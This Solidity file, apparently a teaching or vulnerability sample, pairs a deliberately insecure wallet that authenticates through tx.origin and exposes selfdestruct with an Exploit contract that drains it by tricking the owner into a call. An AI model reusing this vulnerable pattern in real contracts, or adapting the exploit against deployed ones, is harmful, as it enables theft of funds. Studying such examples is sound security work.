// own work
pragma solidity ^0.4.23;

contract SuicidalWallet {
    address owner;
    
    constructor() public {
        owner = tx.origin;
    }
    
    function kill(address heir) public  {
        require(tx.origin == owner);
        selfdestruct(heir);
    }

    function withdraw() public {
        require(tx.origin == owner);
        require(address(this).balance > 0);
        owner.transfer(address(this).balance);
    }
    
    function deposit() payable public {}
}

contract Exploit {
    SuicidalWallet victim;

    constructor (SuicidalWallet _victim) public {
        victim = _victim;
    }

    function () public payable {}
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
    
    function freeEther() public {
        victim.kill(address(this));
    }
}
